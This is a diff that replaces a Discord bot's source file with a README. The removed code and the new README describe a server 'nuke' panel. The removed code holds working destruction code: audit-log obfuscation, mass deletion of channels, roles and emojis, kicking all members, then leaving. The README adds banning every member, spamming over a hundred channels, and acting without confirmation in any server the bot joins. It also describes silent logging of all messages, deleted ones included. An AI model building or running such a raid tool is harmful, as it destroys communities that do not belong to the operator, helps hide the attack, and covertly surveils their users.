@@ -1,465 +1,245 @@
-const { 
-    Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, 
-    ButtonStyle, PermissionFlagsBits, ModalBuilder, TextInputBuilder, 
-    TextInputStyle, SlashCommandBuilder, MessageFlags 
-} = require('discord.js');
-require('dotenv').config();
+# Bot
 
-// Optional per-server reaction-role config. This is NOT a whitelist -
-// the bot works in every server it is invited to. Only servers listed here
-// will have reaction roles / role sync enabled.
+A Discord bot built in Node.js (discord.js v14) with reaction roles, message logging, moderation tools, and a destructive "nuke" panel for server owners.
+
+---
+
+## Features
+
+- Reaction roles, optional and per-server. Assign roles from emoji reactions, with automatic re-sync on startup (catches users who reacted while the bot was offline).
+- Message logging: logs both new messages and deleted messages into an in-bot log view, across every server the bot is in.
+- `/panel` control panel: a private, ephemeral panel with two areas:
+  - Owner Area (whitelisted user IDs only)
+  - Admin Tools (server administrators)
+- Owner tools
+  - Speak as the bot (in any channel by ID)
+  - Send a DM to any user
+  - View logs
+  - Server status (members, boosts, channels, roles, emojis, stickers, creation date)
+  - User info (tag, ID, nickname, join date, roles, avatar)
+  - Nuke server
+- Admin tools
+  - Timeout a member (1-28 days)
+- Nuke: wipes a server, spams channels, changes the name/icon, and leaves (see [Nuke details](#nuke-details)). Owner-only, executes instantly.
+
+---
+
+## Prerequisites
+
+- [Node.js](https://nodejs.org/) v18 or newer (discord.js v14 requires it)
+- A Discord application + bot token ([Discord Developer Portal](https://discord.com/developers/applications))
+- The bot invited to your server(s) with the required permissions
+
+---
+
+## Setup
+
+### 1. Install dependencies
+
+```bash
+npm install
+```
+
+This downloads `discord.js` and `dotenv` into `node_modules`. Run it once after cloning, and again whenever you change `package.json`.
+
+### 2. Create a `.env` file
+
+In the project root, create a file named `.env` and add your bot token:
+
+```env
+TOKEN=your_bot_token_here
+```
+
+Never commit `.env` to git or share your token. If it leaks, reset it in the Developer Portal immediately.
+
+### 3. Create the `icons` folder
+
+The nuke feature picks a random image to set as the server icon before leaving.
+
+1. Create a folder named `icons` in the same directory as `Index.js`.
+2. Place any `.png`, `.jpg`, `.jpeg`, `.webp`, or `.gif` files inside it. The bot will randomly select one during the nuke.
+
+### 4. Enable the required intents
+
+In the [Discord Developer Portal](https://discord.com/developers/applications) -> your app -> Bot -> Privileged Gateway Intents, enable:
+
+- Server Members Intent (for member fetch, bans, timeouts)
+- Message Content Intent (for logging message content)
+
+### 5. Configure the bot in `Index.js`
+
+The bot works in **every server it is invited to**. There is no server whitelist. Just set your trusted user IDs in `OWNER_IDS`:
+
+```js
+const OWNER_IDS = ['123456789012345678']; // Discord user IDs allowed to use the Owner Area
+```
+
+Optionally, to enable reaction roles in a server, fill in an entry in `REACTION_CONFIG`:
+
+```js
 const REACTION_CONFIG = [
     {
-        name: "Server 1",
-        guildId: '',
-        reactionChannelId: '',
-        reactionMessageId: '',
-        roleMap: { '✅': '' }
+        name: "My Server",
+        guildId: '123456789012345678',           // Server (guild) ID
+        reactionChannelId: '123456789012345678', // Channel with the reaction-role message
+        reactionMessageId: '123456789012345678', // Message ID of the reaction-role message
+        roleMap: { '✅': '123456789012345678' }  // emoji -> role ID
     }
 ];
+```
 
-const OWNER_IDS = ['']; // Add your Discord User IDs here
-let systemLogs = [];
+Servers **not** listed in `REACTION_CONFIG` simply won't have reaction roles; every other feature still works.
 
-const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.GuildMessageReactions,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.MessageContent 
-    ],
-    partials: [Partials.Message, Partials.Reaction, Partials.User],
-});
+Enable Developer Mode in Discord (User Settings -> Advanced) so you can right-click -> Copy ID on servers, channels, messages, roles, and users.
 
-const getReactionConfig = (guildId) => REACTION_CONFIG.find(s => s.guildId === guildId);
-const isOwner = (userId) => OWNER_IDS.includes(userId);
+### 6. Bot permissions
 
-// ---------- Helpers ----------
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+When inviting the bot, grant at minimum:
 
-/**
- * Process an array of items concurrently in batches.
- * @param {Array} items        - The items to process.
- * @param {number} concurrency - How many to process at once.
- * @param {Function} fn        - Async function that processes one item.
- * @param {number} delayMs     - Delay between batches (ms).
- */
-async function runConcurrent(items, concurrency, fn, delayMs = 50) {
-    const results = [];
-    for (let i = 0; i < items.length; i += concurrency) {
-        const batch = items.slice(i, i + concurrency);
-        const batchResults = await Promise.allSettled(batch.map(fn));
-        results.push(...batchResults);
-        if (i + concurrency < items.length && delayMs > 0) {
-            await sleep(delayMs);
-        }
-    }
-    return results;
-}
+- Manage Roles (reaction roles)
+- Manage Channels, Manage Roles, Manage Emojis & Stickers, Ban Members, Manage Server (for the nuke)
+- Moderate Members (timeouts)
+- Read/Send Messages, Read Message History (logging, panel)
 
-// ---------- Startup ----------
-client.once('clientReady', async (c) => {
-    console.log(`[SYSTEM] Online as ${c.user.tag}`);
+The simplest option is to give it Administrator, which is required for the nuke to fully work anyway.
 
-    // Register /panel in every guild the bot is in
-    const command = new SlashCommandBuilder().setName('panel').setDescription('Deploy the Control Panel');
-    for (const guild of client.guilds.cache.values()) {
-        try {
-            await guild.commands.set([command]);
-            console.log(`[CMD] Registered /panel in ${guild.name}`);
-        } catch (err) {
-            console.log(`[CMD] Failed to register in ${guild.name}: ${err.message}`);
-        }
-    }
+### 7. Start the bot
 
-    // Auto sync reaction roles on startup (only for servers in REACTION_CONFIG)
-    for (const conf of REACTION_CONFIG) {
-        const guild = client.guilds.cache.get(conf.guildId);
-        if (!guild) continue;
+```bash
+node Index.js
+```
 
-        try {
-            const channel = await guild.channels.fetch(conf.reactionChannelId);
-            const msg = await channel.messages.fetch(conf.reactionMessageId);
-            
-            console.log(`[SYNC] Checking reactions for ${conf.name}...`);
-            
-            for (const [emojiName, roleId] of Object.entries(conf.roleMap)) {
-                const reaction = msg.reactions.cache.get(emojiName);
-                if (!reaction) continue;
+You should see something like:
 
-                const users = await reaction.users.fetch();
-                users.forEach(async (user) => {
-                    if (user.bot) return;
-                    try {
-                        const member = await guild.members.fetch(user.id);
-                        if (!member.roles.cache.has(roleId)) {
-                            await member.roles.add(roleId);
-                            console.log(`[SYNC] Added role to ${user.tag}`);
-                        }
-                    } catch (e) { /* Member likely left */ }
-                });
-            }
-        } catch (err) {
-            console.log(`[ERROR] Sync failed for ${conf.name}: ${err.message}`);
-        }
-    }
-});
+```
+[SYSTEM] Online as YourBot#1234
+[CMD] Cleared global commands to prevent conflicts.
+[CMD] Registered /panel in My Server
+[SYNC] Checking reactions for My Server...
+```
 
-// ---------- Live Message Logger ----------
-client.on('messageCreate', (message) => {
-    if (message.author.bot) return;
-    if (!message.guildId) return; // ignore DMs
-    const content = message.content || "[Embed/Attachment/Sticker]";
-    const logEntry = `**[MSG] ${message.author.tag}** in <#${message.channelId}>: ${content}`;
-    systemLogs.unshift(logEntry);
-    if (systemLogs.length > 50) systemLogs.pop(); // Keep last 50 logs
-});
+On startup the bot registers the `/panel` slash command in **every server it's currently in**. It also clears global commands to prevent Discord client caching bugs. If you invite the bot to a new server later, it automatically registers `/panel` there instantly.
 
-// ---------- Message Deletion Logger ----------
-client.on('messageDelete', (message) => {
-    if (message.author?.bot) return;
-    if (!message.guildId) return;
-    const header = `**[DEL] ${message.author?.tag ?? "Unknown"}** in <#${message.channelId}>`;
-    const content = `> ${message.content || "[Attachment/Embed]"}`;
-    systemLogs.unshift(`${header}\n${content}`); 
-    if (systemLogs.length > 50) systemLogs.pop(); 
-});
+---
 
-// ---------- Reaction Roles ----------
-client.on('messageReactionAdd', async (reaction, user) => {
-    if (user.bot) return;
-    if (reaction.partial) {
-        try { await reaction.fetch(); } catch (err) { return; }
-    }
-    const conf = getReactionConfig(reaction.message.guildId);
-    if (!conf || reaction.message.id !== conf.reactionMessageId) return;
-    const roleId = conf.roleMap[reaction.emoji.name];
-    if (roleId) {
-        try {
-            const member = await reaction.message.guild.members.fetch(user.id);
-            await member.roles.add(roleId);
-        } catch (err) { console.error("Role Add Error:", err); }
-    }
-});
+## Usage
 
-// ---------- NUKE FUNCTION ----------
-async function nukeGuild(guild, botMember) {
-    console.log(`[NUKE] Starting ultimate nuke on ${guild.name}`);
+### Opening the panel
 
-    // ---- 0. Audit Log Obfuscation (Spam name/icon changes) ----
-    console.log(`[NUKE] Obfuscating audit logs...`);
-    try {
-        for (let i = 0; i < 5; i++) {
-            await guild.setName(`NUKED-${Math.random().toString(36).substring(2, 8)}`);
-            await guild.setIcon(null); // Remove icon
-            await guild.setBanner(null); // Remove banner
-            await sleep(150);
-        }
-    } catch (e) { console.log('Audit spam failed:', e.message); }
+In **any** server the bot is in, run:
 
-    // ---- 1. Delete all channels ----
-    const channels = [...guild.channels.cache.values()];
-    console.log(`[NUKE] Deleting ${channels.length} channels...`);
-    await runConcurrent(channels, 10, async (channel) => {
-        try {
-            await channel.delete('Nuke initiated by owner');
-        } catch (err) {
-            // ignore
-        }
-    }, 50);
+```
+/panel
+```
 
-    // ---- 2. Delete all custom roles (except @everyone & managed) ----
-    const roles = [...guild.roles.cache.filter(r => r.id !== guild.id && !r.managed).values()];
-    console.log(`[NUKE] Deleting ${roles.length} roles...`);
-    await runConcurrent(roles, 10, async (role) => {
-        try {
-            await role.delete('Nuke initiated by owner');
-        } catch (err) {
-            // ignore
-        }
-    }, 50);
+Only users in `OWNER_IDS` can use it. You get an ephemeral (private) panel with two buttons:
 
-    // ---- 3. Delete all Emojis ----
-    const emojis = [...guild.emojis.cache.values()];
-    console.log(`[NUKE] Deleting ${emojis.length} emojis...`);
-    await runConcurrent(emojis, 10, async (emoji) => {
-        try {
-            await emoji.delete('Nuke initiated by owner');
-        } catch (err) {
-            // ignore
-        }
-    }, 50);
+| Button | Who can use it | What it does |
+| :--- | :--- | :--- |
+| Owner Area | `OWNER_IDS` | Opens owner-only actions |
+| Admin Tools | Admins | Opens moderation actions |
 
-    // ---- 4. Delete all Stickers ----
-    const stickers = [...guild.stickers.cache.values()];
-    console.log(`[NUKE] Deleting ${stickers.length} stickers...`);
-    await runConcurrent(stickers, 10, async (sticker) => {
-        try {
-            await sticker.delete('Nuke initiated by owner');
-        } catch (err) {
-            // ignore
-        }
-    }, 50);
+### Owner Area
 
-    // ---- 5. Delete all Scheduled Events ----
-    const events = [...(await guild.scheduledEvents.fetch()).values()];
-    console.log(`[NUKE] Deleting ${events.length} scheduled events...`);
-    await runConcurrent(events, 5, async (event) => {
-        try {
-            await event.delete('Nuke initiated by owner');
-        } catch (err) {
-            // ignore
-        }
-    }, 50);
+| Button | Description |
+| :--- | :--- |
+| Speak as Bot | Send a message as the bot to a channel (leave channel ID blank to use the current channel). |
+| Send DM | DM a user by ID with a custom message. |
+| View Logs | Show the last 50 logged entries (new messages + deleted messages + commands). |
+| Server Status | Show member count, boosts, channel/role/emoji/sticker counts, owner, and creation date. |
+| User Info | Look up a member by ID or mention (tag, nickname, join date, roles, avatar). |
+| Nuke Server | Destroys the server (see below). No confirmation required. |
 
-    // ---- 6. Kick all members (except bot) ----
-    const members = [...(await guild.members.fetch()).values()].filter(m => m.id !== botMember.id);
-    console.log(`[NUKE] Kicking ${members.length} members...`);
-    await runConcurrent(members, 5, async (member) => {
-        try {
-            await member.kick('Nuke initiated by owner');
-        } catch (err) {
-            // ignore (owner or higher role)
-        }
-    }, 250);
+### Admin Tools
 
-    // ---- 7. Vanity URL ----
-    try {
-        await guild.setVanityCode(null);
-    } catch (e) { /* ignore if not boosted */ }
+| Button | Description |
+| :--- | :--- |
+| Timeout | Timeout a member by ID for 1-28 days. |
 
-    // ---- 8. Leave the guild ----
-    await guild.leave();
-    console.log(`[NUKE] Left guild ${guild.name}`);
-}
+### Reaction roles (optional)
 
-// ---------- Interaction Handler ----------
-client.on('interactionCreate', async interaction => {
-    if (!interaction.guildId) return; // ignore DMs
+Only servers listed in `REACTION_CONFIG` support reaction roles. For each entry:
 
-    // ---- Slash Command: /panel ----
-    if (interaction.isChatInputCommand() && interaction.commandName === 'panel') {
-        const userIsOwner = isOwner(interaction.user.id);
-        systemLogs.unshift(`**[CMD] ${interaction.user.tag}** ran **/panel** (${userIsOwner ? "ALLOWED" : "DENIED"}) in ${interaction.guild.name}`);
-        if (!userIsOwner) return interaction.reply({ content: 'No perms.', flags: [MessageFlags.Ephemeral] });
+1. Post a message in the configured `reactionChannelId`.
+2. React to it with the emojis defined in `roleMap`.
+3. Put the message ID in `reactionMessageId`.
 
-        const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder().setCustomId('tab_owner').setLabel('Owner Area').setStyle(ButtonStyle.Danger),
-            new ButtonBuilder().setCustomId('tab_admin').setLabel('Admin Tools').setStyle(ButtonStyle.Primary)
-        );
-        return interaction.reply({ content: '### Control Panel', components: [row], flags: [MessageFlags.Ephemeral] });
-    }
+Users who react get the matching role. On every bot restart, the bot re-scans the reactions and re-adds any missing roles.
 
-    // ---- Buttons ----
-    if (interaction.isButton()) {
-        // ----- Owner Area (Tab) -----
-        if (interaction.customId === 'tab_owner') {
-            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId('owner_say').setLabel('Speak as Bot').setStyle(ButtonStyle.Secondary),
-                new ButtonBuilder().setCustomId('owner_dm').setLabel('Send DM').setStyle(ButtonStyle.Secondary),
-                new ButtonBuilder().setCustomId('owner_view_logs').setLabel('View Logs').setStyle(ButtonStyle.Secondary),
-                new ButtonBuilder().setCustomId('owner_server_status').setLabel('Server Status').setStyle(ButtonStyle.Primary),
-                new ButtonBuilder().setCustomId('owner_user_info').setLabel('User Info').setStyle(ButtonStyle.Primary),
-                new ButtonBuilder().setCustomId('owner_nuke').setLabel('Nuke Server').setStyle(ButtonStyle.Danger)
-            );
-            return interaction.reply({ content: 'Owner Actions:', components: [row], flags: [MessageFlags.Ephemeral] });
-        }
+---
 
-        // ----- Admin Tools (Tab) -----
-        if (interaction.customId === 'tab_admin') {
-            if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder().setCustomId('admin_timeout').setLabel('Timeout').setStyle(ButtonStyle.Secondary)
-            );
-            return interaction.reply({ content: 'Admin Tools:', components: [row], flags: [MessageFlags.Ephemeral] });
-        }
+## Nuke details
 
-        // ----- Owner: Server Status -----
-        if (interaction.customId === 'owner_server_status') {
-            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
-            const g = interaction.guild;
-            const info = `
-**Server Status**
-**Name:** ${g.name}
-**ID:** ${g.id}
-**Owner:** <@${g.ownerId}>
-**Members:** ${g.memberCount}
-**Boosts:** ${g.premiumSubscriptionCount || 0}
-**Channels:** ${g.channels.cache.size}
-**Roles:** ${g.roles.cache.size}
-**Emojis:** ${g.emojis.cache.size}
-**Stickers:** ${g.stickers.cache.size}
-**Created:** <t:${Math.floor(g.createdTimestamp / 1000)}:R>
-            `;
-            return interaction.reply({ content: info, flags: [MessageFlags.Ephemeral] });
-        }
+Owner-only. Irreversible. Clicking the button executes the nuke instantly.
 
-        // ----- Owner: User Info -----
-        if (interaction.customId === 'owner_user_info') {
-            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
-            const modal = new ModalBuilder().setCustomId('modal_userinfo').setTitle('User Info');
-            modal.addComponents(
-                new ActionRowBuilder().addComponents(
-                    new TextInputBuilder()
-                        .setCustomId('user_id_input')
-                        .setLabel('User ID or Mention')
-                        .setStyle(TextInputStyle.Short)
-                        .setRequired(true)
-                        .setPlaceholder('123456789012345678 or @user')
-                )
-            );
-            return interaction.showModal(modal);
-        }
+When triggered, the bot runs these steps:
 
-        // ----- Owner: Speak -----
-        if (interaction.customId === 'owner_say') {
-            const modal = new ModalBuilder().setCustomId('modal_say').setTitle('The Megaphone');
-            modal.addComponents(
-                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s_text').setLabel("Message Content").setStyle(TextInputStyle.Paragraph).setRequired(true)),
-                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s_channel').setLabel("Channel ID (Optional)").setStyle(TextInputStyle.Short).setRequired(false))
-            );
-            return interaction.showModal(modal);
-        }
+1. **Bans all members** (except the server owner, the bot, and the person who initiated the nuke). Deletes 7 days of their messages.
+2. **Deletes all channels** (text, voice, categories, etc.)
+3. **Deletes all custom roles** (except `@everyone` and bot-managed roles)
+4. **Deletes all emojis**
+5. **Deletes all stickers**
+6. **Deletes all scheduled events**
+7. **Spams new channels**: creates 50 text channels, 50 voice channels, and 10 forum channels.
+8. **Removes the vanity URL** (if the server has one)
+9. **Server update**: changes the server name once to `NUKED-xxxxxx` and applies a **random icon** from your `icons` folder.
+10. **Leaves the server**
 
-        // ----- Owner: DM -----
-        if (interaction.customId === 'owner_dm') {
-            const modal = new ModalBuilder().setCustomId('modal_dm').setTitle('Send Direct Message');
-            modal.addComponents(
-                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('dm_target').setLabel("User ID").setStyle(TextInputStyle.Short).setRequired(true)),
-                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('dm_text').setLabel("Message").setStyle(TextInputStyle.Paragraph).setRequired(true))
-            );
-            return interaction.showModal(modal);
-        }
+The server itself is not deleted; only the server owner can delete a server via Discord. After the nuke, the server is left destroyed and the bot has left.
 
-        // ----- Owner: View Logs -----
-        if (interaction.customId === 'owner_view_logs') {
-            const content = systemLogs.length > 0 ? systemLogs.join('\n\n') : "No recent logs.";
-            return interaction.update({ content: `### System Logs (Last 50)\n${content}`, components: [] });
-        }
+The nuke is rate-limit tolerant: individual failures are ignored so the process always completes. On very large servers, some actions may be skipped due to Discord rate limits.
 
-        // ----- Owner: Nuke -----
-        if (interaction.customId === 'owner_nuke') {
-            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
+Do not run this on a server you don't own or don't want destroyed.
 
-            const modal = new ModalBuilder()
-                .setCustomId('modal_nuke')
-                .setTitle('NUKE SERVER - CONFIRM')
-                .addComponents(
-                    new ActionRowBuilder().addComponents(
-                        new TextInputBuilder()
-                            .setCustomId('nuke_confirm')
-                            .setLabel('Type CONFIRM to proceed')
-                            .setStyle(TextInputStyle.Short)
-                            .setRequired(true)
-                            .setPlaceholder('CONFIRM')
-                    )
-                );
-            return interaction.showModal(modal);
-        }
+---
 
-        // ----- Admin: Timeout -----
-        if (interaction.customId === 'admin_timeout') {
-            const modal = new ModalBuilder().setCustomId('modal_timeout').setTitle('Admin Timeout');
-            modal.addComponents(
-                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t_target').setLabel("User ID").setStyle(TextInputStyle.Short).setRequired(true)),
-                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t_days').setLabel("Days (1-28)").setStyle(TextInputStyle.Short).setRequired(true))
-            );
-            return interaction.showModal(modal);
-        }
-    }
+## Keeping the bot online
 
-    // ---------- Modal Submits ----------
-    if (interaction.isModalSubmit()) {
-        // ----- Speak Modal -----
-        if (interaction.customId === 'modal_say') {
-            const content = interaction.fields.getTextInputValue('s_text');
-            const targetChannelId = interaction.fields.getTextInputValue('s_channel');
-            try {
-                const targetChannel = targetChannelId ? await client.channels.fetch(targetChannelId) : interaction.channel;
-                await targetChannel.send(content);
-                return interaction.reply({ content: `Sent to <#${targetChannel.id}>`, flags: [MessageFlags.Ephemeral] });
-            } catch (err) { return interaction.reply({ content: `Error: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
-        }
+`node Index.js` stops when you close the terminal. For 24/7 hosting, use a process manager such as [PM2](https://pm2.keymetrics.io/):
 
-        // ----- DM Modal -----
-        if (interaction.customId === 'modal_dm') {
-            const targetId = interaction.fields.getTextInputValue('dm_target');
-            const msg = interaction.fields.getTextInputValue('dm_text');
-            try {
-                const user = await client.users.fetch(targetId);
-                await user.send(msg);
-                return interaction.reply({ content: `DM sent to <@${targetId}>`, flags: [MessageFlags.Ephemeral] });
-            } catch (err) { return interaction.reply({ content: `Failed: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
-        }
+```bash
+npm install -g pm2
+pm2 start Index.js --name discord-bot
+pm2 save
+pm2 startup   # follow the printed instructions
+```
 
-        // ----- Timeout Modal -----
-        if (interaction.customId === 'modal_timeout') {
-            const id = interaction.fields.getTextInputValue('t_target');
-            const days = parseInt(interaction.fields.getTextInputValue('t_days'));
-            if (isNaN(days) || days < 1 || days > 28) return interaction.reply({ content: 'Invalid days.', flags: [MessageFlags.Ephemeral] });
-            try {
-                const member = await interaction.guild.members.fetch(id);
-                await member.timeout((days * 24 * 60 * 60 * 1000) - 60000, "Panel Timeout");
-                return interaction.reply({ content: `Timed out <@${id}> for ${days} days.`, flags: [MessageFlags.Ephemeral] });
-            } catch (err) { return interaction.reply({ content: `Error: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
-        }
+Useful PM2 commands:
 
-        // ----- User Info Modal -----
-        if (interaction.customId === 'modal_userinfo') {
-            const input = interaction.fields.getTextInputValue('user_id_input').trim();
-            let userId = input.replace(/[<@!>]/g, ''); // strip mention chars
-            try {
-                const member = await interaction.guild.members.fetch(userId);
-                const user = member.user;
-                const info = `
-**User Info**
-**Tag:** ${user.tag}
-**ID:** ${user.id}
-**Nickname:** ${member.nickname || 'None'}
-**Bot:** ${user.bot ? 'Yes' : 'No'}
-**Joined:** <t:${Math.floor(member.joinedTimestamp / 1000)}:R>
-**Created:** <t:${Math.floor(user.createdTimestamp / 1000)}:R>
-**Roles:** ${member.roles.cache.map(r => r.toString()).join(', ') || 'None'}
-**Avatar:** ${user.displayAvatarURL({ size: 256, dynamic: true })}
-                `;
-                return interaction.reply({ content: info, flags: [MessageFlags.Ephemeral] });
-            } catch (err) {
-                return interaction.reply({ content: `User not found in this server.`, flags: [MessageFlags.Ephemeral] });
-            }
-        }
+```bash
+pm2 logs discord-bot    # view live logs
+pm2 restart discord-bot # restart after editing files
+pm2 stop discord-bot    # stop the bot
+pm2 status              # list running processes
+```
 
-        // ----- NUKE CONFIRMATION -----
-        if (interaction.customId === 'modal_nuke') {
-            const confirmText = interaction.fields.getTextInputValue('nuke_confirm');
-            if (confirmText !== 'CONFIRM') {
-                return interaction.reply({ content: 'Confirmation text did not match. Action cancelled.', flags: [MessageFlags.Ephemeral] });
-            }
+You can also run the bot on a VPS, a Raspberry Pi, or a hosting service that supports Node.js.
 
-            await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
+---
 
-            const guild = interaction.guild;
-            const botMember = guild.members.me;
+## Troubleshooting
 
-            try {
-                await nukeGuild(guild, botMember);
-                // After leaving, we can't reply to the interaction, so DM the owner
-                try {
-                    const owner = await client.users.fetch(interaction.user.id);
-                    await owner.send(`Server **${guild.name}** has been fully nuked and the bot has left.`);
-                } catch (dmErr) { /* ignore */ }
-                try {
-                    await interaction.editReply({ content: 'Nuke completed. Bot has left the server.' });
-                } catch (editErr) { /* ignore */ }
-            } catch (err) {
-                console.error('Nuke error:', err);
-                try {
-                    await interaction.editReply({ content: `Nuke failed: ${err.message}` });
-                } catch (e) { /* ignore */ }
-            }
-        }
-    }
-});
+| Problem | Fix |
+| :--- | :--- |
+| `Used disallowed intents` | You need to enable **Server Members Intent** and **Message Content Intent** in the Discord Developer Portal under the Bot tab. |
+| `Cannot find module 'discord.js'` | Dependencies not installed. Run `npm install` in the folder containing `package.json`. |
+| `Error: An invalid token was provided` | Check `TOKEN` in `.env`, no quotes, no spaces. Reset the token if unsure. |
+| Slash command `/panel` doesn't appear | The bot registers it per-guild on startup. If you just invited the bot to a new server, restart it. |
+| "No perms" in Owner Area | Your user ID isn't in `OWNER_IDS`. |
+| Reaction roles not applying | Verify `reactionMessageId`, `reactionChannelId`, emoji keys in `roleMap`, and that the bot's role is above the role it's assigning. Also confirm the server is listed in `REACTION_CONFIG`. |
+| Nuke didn't change the icon | Make sure you have an `icons` folder in the same directory as `Index.js` with valid image files. Check the console for read errors. |
+| Nuke stops early / skips things | Rate limits. The bot logs failures to console; most servers complete quickly. |
 
-client.login(process.env.TOKEN);
+---
+
+## Security notes
+
+- Keep `.env` private. Never paste your token into chat, screenshots, or public repos.
+- Only add trusted user IDs to `OWNER_IDS`; they can nuke any server the bot is in.
+- The nuke is destructive by design. Test in a throwaway server first.
+
+---
+
+## License
+
+Personal project, no license specified. Use at your own risk.
